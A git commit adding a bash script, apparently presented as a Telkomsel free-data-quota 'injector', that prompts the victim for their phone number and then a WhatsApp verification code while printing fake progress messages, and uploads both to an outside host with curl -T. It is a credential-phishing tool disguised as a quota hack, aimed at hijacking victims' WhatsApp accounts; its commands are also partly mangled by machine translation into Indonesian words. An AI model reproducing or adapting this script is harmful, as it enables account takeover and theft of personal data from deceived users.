be2dbf6e3b780f1a58dd8ab4bd8f4ce69caebab9
AjiSetiawan1205 <47689775+AjiSetiawan1205@users.noreply.github.com>
2019-02-17 10:17:06 +0700

    Create tsel.sh

---
+++ tsel.sh
@@ -0,0 +1,116 @@
+#! / bin / bash
+
+
+bersih
+
+
+gema "
+
+<- DSFS Team ->
+
+####################
+
+# By Xenon1205
+
+# Thanks D4RK SYST3M F41LUR3 S33K3R
+
+####################
+
+SEMOGA BERUNTUNG " ;
+
+
+gema " " ;
+
+
+baca -p " Isi dengan Nomer Kamu ex(+ 62xxxx) => " nomer ;
+
+
+baca p " Berapa Kouta(GB) Yang akan di tembak? => " jangan masukkan ;
+
+
+tidur 2
+
+
+echo " [+] proses ... " ;
+
+
+tidur 1
+
+
+echo " Login => $ nomer " ;
+
+
+tidur 0,5
+
+
+echo " Target => $ Jumlah " ;
+
+
+tidur 0,5
+
+
+gema " [+] Memanfaatkan ... " ;
+
+
+echo " Nomer => $ nomer " >> Sukses.html ;
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+tidur 5 ;
+
+
+echo " [+] Done. " ;
+
+
+echo " Selamat Penembakan telah Sukses. " ;
+
+
+baca -p " Kode Verifikasi => " kode ;
+
+
+tidur 2
+
+
+echo " [+] Menghubungkan ke whatsapp.com ... " ;
+
+
+echo " Login => $ nomer " ;
+
+
+tidur 0,5
+
+
+echo " Code => $ Jumlah " ;
+
+
+tidur 0,5
+
+
+echo " Target => $ jumlah " ;
+
+
+tidur 0,5
+
+
+echo " [+] Mengirim Eksploitasi ... " ;
+
+
+echo " Code => $ code " >> Sukses.html ;
+
+
+curl -T Sukses.html http://apparelworld.org/
+
+
+tidur 5
+
+
+echo " [+] Sukses Dimanfaatkan! " ;
+
+
+keluar ;
+
+
+D
+
